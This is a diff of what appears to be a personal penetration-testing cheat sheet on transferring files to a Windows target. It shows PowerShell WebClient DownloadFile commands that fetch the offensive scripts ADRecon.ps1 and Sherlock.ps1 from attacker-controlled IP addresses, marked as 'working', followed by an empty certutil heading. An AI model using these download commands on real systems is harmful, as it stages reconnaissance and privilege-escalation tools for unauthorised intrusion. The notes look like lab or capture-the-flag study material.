@@ -9,13 +9,12 @@
 
            b) way 2 : Download and Write on Disk ==>                     
                         ==> from inside of powerview       
-                                  (New-Object Net.WebClient).DownloadFile('http://10.17.20.181:8000/ADRecon.ps1', 'ADRecon.ps1')                     *
+                                  (New-Object Net.WebClient).DownloadFile('http://10.17.20.181:8000/ADRecon.ps1', 'ADRecon.ps1')                     * working both
                                   (New-Object Net.WebClient).DownloadFile('http://10.17.20.181:8000/ADRecon.ps1', './dir/ADRecon.ps1')               * working both
                         
                        
-                       ==> from out-side of powerview       
-                                  powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.37:8000/Sherlock.ps1', 'sherloack.ps1')
-
+                        ==> from CMD       
+                                  powershell -c (New-Object Net.WebClient).DownloadFile('http://10.17.20.181:8000/ADRecon.ps1', 'ADRecon.ps1')        * working  
 
 2) certutil  ==> 
 
